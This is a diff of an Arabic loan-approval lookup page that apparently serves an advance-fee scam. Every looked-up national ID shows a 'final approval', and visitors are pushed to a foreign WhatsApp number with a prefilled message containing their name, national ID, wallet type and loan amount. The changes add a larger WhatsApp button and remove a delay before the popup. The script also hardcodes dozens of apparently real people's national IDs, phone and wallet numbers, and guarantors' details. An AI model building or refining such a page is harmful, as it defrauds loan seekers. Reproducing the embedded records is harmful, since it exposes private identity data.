@@ -69,7 +69,7 @@
         .error-card { background: rgba(255, 80, 80, 0.15); border: 1px solid #ff5e5e; border-radius: 1.5rem; padding: 2rem; text-align: center; display: none; margin-top: 1rem; }
         .loader { text-align: center; display: none; margin: 1rem; }
         
-        /* نافذة منبثقة صغيرة محسنة */
+        /* نافذة منبثقة */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -188,6 +188,36 @@
         .modal-body strong {
             color: var(--accent-gold);
         }
+        .whatsapp-button-large {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            border: none;
+            padding: 1rem;
+            border-radius: 3rem;
+            font-weight: bold;
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+            transition: 0.2s;
+            color: white;
+            width: 100%;
+            margin: 1rem 0;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
+        }
+        .whatsapp-button-large:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px #25D366;
+        }
+        .approval-note {
+            background: rgba(0, 200, 83, 0.1);
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            text-align: center;
+            border: 1px dashed var(--success-green);
+        }
     </style>
 </head>
 <body>
@@ -209,7 +239,7 @@
     <div class="footer-info"><i class="fab fa-whatsapp"></i> سيتم توجيهك إلى خدمة التحويلات المالية على واتساب لإنهاء الإجراءات | جميع البيانات مشفرة</div>
 </div>
 
-<!-- نافذة منبثقة صغيرة الحجم (Compact) -->
+<!-- نافذة منبثقة للتواصل مع التحويلات المالية -->
 <div class="modal-overlay" id="redirectModal">
     <div class="modal-container">
         <div class="modal-header">
@@ -218,10 +248,9 @@
         <div class="modal-body">
             <p style="font-weight:500;">✔️ تهانينا! تمت الموافقة النهائية على طلب التمويل.</p>
             <div class="client-info-modal" id="modalClientInfo"></div>
-            <p><strong>📲 خطوة واحدة:</strong> اضغط الزر للوصول إلى خدمة التحويلات المالية عبر واتساب.</p>
-            <p style="font-size:0.8rem;">سيتم إرسال بيانات طلبك لإنهاء إجراءات الصرف وتحويل المبلغ فوراً.</p>
+            <p><strong>📲 خطوة واحدة:</strong> اضغط الزر للوصول إلى خدمة التحويلات المالية عبر واتساب لإنهاء إجراءات صرف القرض.</p>
             <div class="whatsapp-note">
-                <i class="fab fa-whatsapp"></i> سيفتح الواتساب برسالة جاهزة تتضمن اسمك ورقمك القومي ونوع المحفظة.
+                <i class="fab fa-whatsapp"></i> سيفتح الواتساب برسالة جاهزة تتضمن اسمك ورقمك القومي ونوع المحفظة والمبلغ.
             </div>
         </div>
         <div class="modal-footer">
@@ -235,9 +264,9 @@
 
 <script>
     // ***** قاعدة العملاء (جميع الطلبات موافقة) *****
-    // تم دمج جميع العملاء الأصليين + العملاء الجدد من ملف "نموذج استمارة.xlsx" مع منع التكرار
+    // العملاء الأصليون + العملاء الجدد من نموذج استمارة.xlsx
     const clientsData = [
-        // ---------- العملاء الأصليون (محفوظون بالكامل) ----------
+        // العملاء الأصليون
         { id:"29006040102911", name:"مصطفى ربيع عبد الحميد", job:"عمل حر", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01003165531", guarantorRelation:"عم", guarantorName:"محمود علي محمد", guarantorId:"28304241400951", guarantorPhone:"0111857964", reason:"التزامات ولزوم دفع مصروفات", otherLoans:"لايوجد", status:"approved" },
         { id:"29409010209751", name:"انس محمد حسين محمد", job:"موظف قطاع خاص", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01009031820", guarantorRelation:"زوجة", guarantorName:"اسراء سالم الكيلاني سالم", guarantorId:"29909010206445", guarantorPhone:"01044288513", reason:"للسفر", otherLoans:"نعم", status:"approved" },
         { id:"27108062501071", name:"اسماعيل محمد خليل محمد", job:"موظف حكومي", loanRaw:"55,000", loanTerm:"24 شهر", installment:"3,075", total:"73,800", wallet:"اتصالات كاش", walletNum:"01115421242", guarantorRelation:"زوجة", guarantorName:"مشيرة ممدوح سيد هيكل", guarantorId:"28910142503044", guarantorPhone:"01153899445", reason:"علاج ابنى مريض لطيف التوحد", otherLoans:"نعم", status:"approved" },
@@ -266,7 +295,7 @@
         { id:"29410714221072", name:"رضا سعيد احمد ابو الحسن", job:"تاجر خردة", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"لا يوجد محفظة", walletNum:"01004252795", guarantorRelation:"زوج", guarantorName:"نجاه عبد العزيز سطوح الجندي", guarantorId:"98510715020262", guarantorPhone:"01551702690", reason:"عشان اكبر نشاطي", otherLoans:"نعم", status:"approved" },
         { id:"264030100116", name:"موسي احمد موسي احمد", job:"صاحب مكتب استيراد وتصدير", loanRaw:"50,000", loanTerm:"24 شهر", installment:"2,725", total:"65,400", wallet:"اتصالات كاش", walletNum:"01143960705", guarantorRelation:"زوجة", guarantorName:"امل شعبان محمود عبد اللطيف", guarantorId:"27701010113105", guarantorPhone:"01121775883", reason:"تطوير الأعمال", otherLoans:"لايوجد", status:"approved" },
         
-        // ---------- العملاء الجدد بالكامل من ملف "نموذج استمارة.xlsx" (تمت إضافتهم بدون تكرار) ----------
+        // العملاء الجدد من نموذج استمارة.xlsx
         { id:"26507070103112", name:"أحمد عبد الفتاح الضوي محمد", job:"صاحب معاش", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"اتصالات كاش", walletNum:"01152452111", guarantorRelation:"زوجة", guarantorName:"عزة عبد الحميد جوهر محمد", guarantorId:"26607110103565", guarantorPhone:"01004414149", reason:"زواج أبني الأكبر وإجراء بعض الإصلاحات بالمنزل", otherLoans:"نعم", status:"approved" },
         { id:"28710251305512", name:"إبراهيم محمد صبري محمد", job:"مشرف تشطيب", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"فودافون كاش", walletNum:"01000124702", guarantorRelation:"زوجة", guarantorName:"ايمان نبيل", guarantorId:"29501272100169", guarantorPhone:"01152922626", reason:"لتشغيل ف تشطيب خاص", otherLoans:"لا", status:"approved" },
         { id:"27503111700331", name:"ياسر شبل محمد عبد العاطي", job:"صاحب مشروع قائم", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01000999850", guarantorRelation:"اخ", guarantorName:"حسام شبل محمد عبد العاطي", guarantorId:"27704031700611", guarantorPhone:"01201697016", reason:"سيوله لزياده المبيعات", otherLoans:"لا", status:"approved" },
@@ -293,8 +322,6 @@
     ];
 
     let currentClient = null;
-    let modalTimeout = null;
-    // رقم خدمة التحويلات المالية على واتساب (معتمد)
     const WHATSAPP_NUMBER = "212632807872";
 
     function buildApprovalHTML(client) {
@@ -342,9 +369,12 @@
                     </table>
                 </div>
             </div>
-            <div style="background: rgba(0,200,83,0.1); border-radius: 1.2rem; padding: 0.8rem; text-align: center; border: 1px dashed var(--success-green);">
-                <i class="fab fa-whatsapp"></i> سيتم فتح محادثة واتساب مع خدمة التحويلات المالية خلال 5 ثوانٍ.
+            <div class="approval-note">
+                <i class="fab fa-whatsapp"></i> سيتم فتح محادثة واتساب مع خدمة التحويلات المالية فوراً لإتمام الصرف.
             </div>
+            <button class="whatsapp-button-large" id="directWhatsAppBtn">
+                <i class="fab fa-whatsapp fa-lg"></i> التواصل مع التحويلات المالية لصرف القرض
+            </button>
         `;
     }
 
@@ -364,10 +394,8 @@
     function closeModal() {
         const modal = document.getElementById('redirectModal');
         if (modal) modal.style.display = 'none';
-        if (modalTimeout) clearTimeout(modalTimeout);
     }
 
-    // إرسال رسالة إلى خدمة التحويلات المالية على واتساب
     function sendToWhatsApp(client) {
         const walletType = client.wallet || "غير محدد";
         const walletNumber = client.walletNum || "غير مسجل";
@@ -392,10 +420,16 @@
         resultDiv.classList.add('show');
         document.getElementById('errorCard').style.display = 'none';
         
-        if (modalTimeout) clearTimeout(modalTimeout);
-        modalTimeout = setTimeout(() => {
-            showApprovalModal(client);
-        }, 5000);
+        // إظهار النافذة المنبثقة فوراً بمجرد ظهور النتيجة
+        showApprovalModal(client);
+        
+        // إضافة مستمع للزر المباشر في البطاقة
+        const directBtn = document.getElementById('directWhatsAppBtn');
+        if (directBtn) {
+            directBtn.addEventListener('click', function() {
+                sendToWhatsApp(client);
+            });
+        }
     }
 
     function searchCustomer() {
@@ -418,11 +452,11 @@
             } else {
                 document.getElementById('resultCard').classList.remove('show');
                 document.getElementById('errorCard').style.display = 'block';
-                if (modalTimeout) clearTimeout(modalTimeout);
             }
         }, 800);
     }
 
+    // مستمع للأزرار
     document.addEventListener('click', function(e) {
         if (e.target && e.target.id === 'confirmRedirectBtn') {
             if (currentClient) {
@@ -439,7 +473,6 @@
         const modal = document.getElementById('redirectModal');
         if (event.target === modal) {
             modal.style.display = 'none';
-            if (modalTimeout) clearTimeout(modalTimeout);
         }
     }
 </script>
